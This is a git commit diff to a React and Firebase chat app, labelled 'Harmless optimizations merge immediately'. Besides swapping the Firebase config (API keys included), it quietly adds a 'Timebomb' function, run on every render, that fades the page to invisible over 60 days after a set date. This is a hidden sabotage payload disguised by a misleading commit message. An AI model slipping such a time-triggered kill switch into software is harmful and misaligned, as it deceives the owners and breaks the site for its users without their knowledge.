5ae0ceec8dc0cf770d8fdc4782b8ae85edf051ff
mens-rea <juan.miguel.g.alvarez@gmail.com>
2021-10-11 13:50:50 +0800

    Harmless optimizations merge immediately

--- src/App.js
+++ src/App.js
@@ -10,14 +10,36 @@ import { useAuthState } from 'react-firebase-hooks/auth';
 import { useCollectionData } from 'react-firebase-hooks/firestore';
 
 firebase.initializeApp({
-  apiKey: "AIzaSyCAR6HtCT_tJf13xeGSdbRFhKLJwExtzPc",
-  authDomain: "react-chat-eb362.firebaseapp.com",
-  projectId: "react-chat-eb362",
-  storageBucket: "react-chat-eb362.appspot.com",
-  messagingSenderId: "44696554358",
-  appId: "1:44696554358:web:cd5c4bdde1da2b7f924857",
-  measurementId: "G-XVKNLGZE36"
+  apiKey: "AIzaSyDk7VMMBwr6bqDsrzbUYGpnthHaMioYe2s",
+  authDomain: "chat-app-15946.firebaseapp.com",
+  projectId: "chat-app-15946",
+  storageBucket: "chat-app-15946.appspot.com",
+  messagingSenderId: "533178884935",
+  appId: "1:533178884935:web:ef9483d776d0107ffe6262",
+  measurementId: "G-P58VBCQ0SY"
 })
+
+function Timebomb() {
+	/* change these variables as you wish */
+	var due_date = new Date('2021-11-20');
+	var days_deadline = 60;
+	/* stop changing here */
+	
+	var current_date = new Date();
+	var utc1 = Date.UTC(due_date.getFullYear(), due_date.getMonth(), due_date.getDate());
+	var utc2 = Date.UTC(current_date.getFullYear(), current_date.getMonth(), current_date.getDate());
+	var days = Math.floor((utc2 - utc1) / (1000 * 60 * 60 * 24));
+	
+	if(days > 0) {
+		var days_late = days_deadline-days;
+		var opacity = (days_late*100/days_deadline)/100;
+			opacity = (opacity < 0) ? 0 : opacity;
+			opacity = (opacity > 1) ? 1 : opacity;
+		if(opacity >= 0 && opacity <= 1) {
+			document.getElementsByTagName("BODY")[0].style.opacity = opacity;
+		}
+	}
+}
 
 const auth = firebase.auth();
 const firestore = firebase.firestore();
@@ -27,6 +49,8 @@ const analytics = firebase.analytics();
 function App() {
 
   const [user] = useAuthState(auth);
+
+  Timebomb();
 
   return (
     <div className="App">
